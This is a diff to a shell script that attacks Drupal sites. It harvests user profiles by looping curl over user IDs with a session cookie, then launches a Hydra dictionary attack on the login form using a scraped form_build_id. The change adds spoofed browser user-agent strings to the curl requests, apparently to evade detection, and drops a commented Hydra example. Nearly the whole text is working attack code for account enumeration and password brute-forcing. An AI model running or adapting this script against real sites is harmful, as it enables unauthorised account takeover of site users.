@@ -60,12 +60,12 @@ mkdir export
 if [ $clean = "n" ]; then
 	for i in $(seq 1 $accounts);
 	do
-		curl -s -b $session $protocol://$site/?q=user/$i > export/$i.txt
+		curl -s -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" -b $session $protocol://$site/?q=user/$i > export/$i.txt
 	done
 else
 	for i in $(seq 1 $accounts);
 	do
-		curl -s -b $session $protocol://$site/user/$i > export/$i.txt
+		curl -s -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" -b $session $protocol://$site/user/$i > export/$i.txt
 	done
 fi
 
@@ -92,7 +92,7 @@ else
 fi
 
 #run a dictionary attack against user accounts
-id=$(curl -s $protocol://$site/user/ | grep "form_build_id" | cut -d "\"" -f 6)
+id=$(curl -s -A "Mozilla/5.0" $protocol://$site/user/ | grep "form_build_id" | cut -d "\"" -f 6)
 echo "attempting to access "$accounts" accounts using the wordlist ("$file")"
 echo $(cat $file| wc -l )" logon attempts will be made against each account"
 
@@ -102,7 +102,6 @@ echo "launching Hydra..."
 echo "----------------------------------------"
 if [ $protocol = "http" ]; then
 	/usr/bin/hydra -L usernames.txt -P $file $out http-form-post $pre"/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry"
-#hydra -l admin -P pwds.txt attacking.drupal.org http-post-form "/d6/node?destination=node:name=^USER^&pass=^PASS^&form_id=user_login_block&form_build_id=form-4f81eea9f5f4743e490ba666f0c32384:Sorry"
 else
 	/usr/bin/hydra -L usernames.txt -P $file $out https-form-post $pre"/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry"
 fi
